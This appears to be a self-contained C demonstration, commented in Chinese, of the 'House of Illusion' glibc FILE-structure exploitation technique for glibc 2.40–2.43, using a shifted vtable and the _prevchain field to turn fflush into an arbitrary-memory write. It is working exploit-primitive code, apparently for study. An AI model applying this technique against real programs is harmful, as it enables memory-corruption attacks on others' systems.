#define _GNU_SOURCE

/*
 * House of Illusion 的 shifted vtable 手法，适用于 glibc 2.40～2.43。
 *
 * 与 2.23～2.39 版本的文件相比，唯一需要注意的变化是 fake FILE 必须
 * 额外填写 _prevchain 字段。触发的底层系统调用仍然是
 * read(fd, target, length)，从漏洞利用的角度看依旧是一次任意地址写。
 */

#include <assert.h>
#include <dlfcn.h>
#include <stdio.h>
#include <string.h>
#include <unistd.h>

#define IO_DELETE_DONT_CLOSE 0x0040
#define IO_IS_APPENDING 0x1000
#define IO_LINKED 0x0080

struct fake_file_plus {
    FILE file;
    const void *vtable;
};

int main(void)
{
    static char input[] = "ILLUSION:FD-TO-MEMORY";
    char target[sizeof(input)] = {0};
    char lock[64] = {0};
    struct fake_file_plus fake;
    int pipe_fd[2];

    memset(&fake, 0, sizeof(fake));

    /* 这里用 dlsym 直接取符号地址，只是省去手写 libc 泄漏和偏移计算的步骤；
     * 实际题目里这两个符号地址通常要靠已有的信息泄漏拿到。 */
    void **io_list_all = dlsym(RTLD_DEFAULT, "_IO_list_all");
    unsigned char *file_jumps = dlsym(RTLD_DEFAULT, "_IO_file_jumps");
    assert(io_list_all != NULL && file_jumps != NULL);

    void *saved_list = *io_list_all;

    assert(pipe(pipe_fd) == 0);
    assert(write(pipe_fd[1], input, sizeof(input)) == sizeof(input));
    close(pipe_fd[1]);

    fake.file._lock = (void *)lock;
    fake.file._chain = NULL;
    fake.file._mode = 0;
    fake.file._flags = IO_LINKED | IO_DELETE_DONT_CLOSE | IO_IS_APPENDING;
    fake.file._fileno = pipe_fd[0];
    fake.file._IO_write_base = target;
    fake.file._IO_write_ptr = target + sizeof(target);

    /*
     * glibc 从 2.40 开始，把 FILE 结构偏移 0xb8 处的空间复用成了
     * _prevchain 字段。因为 fake 现在是链表里的头节点，所以它的
     * _prevchain 必须回指到 _IO_list_all 这个保存链表头指针的槽位。
     */
    *(void ***)((char *)&fake.file + 0xb8) = io_list_all;

    /* vtable 平移之后，槽位的调用关系发生错位：本该调用 overflow 的地方
     * 实际调用了 finish，本该调用 write 的地方实际调用了 read。 */
    fake.vtable = file_jumps - 0x8;

    *io_list_all = &fake;
    fflush(NULL);

    *io_list_all = saved_list;
    close(pipe_fd[0]);

    assert(memcmp(target, input, sizeof(input)) == 0);
    printf("[+] Illusion 任意写成功\n");
    return 0;
}
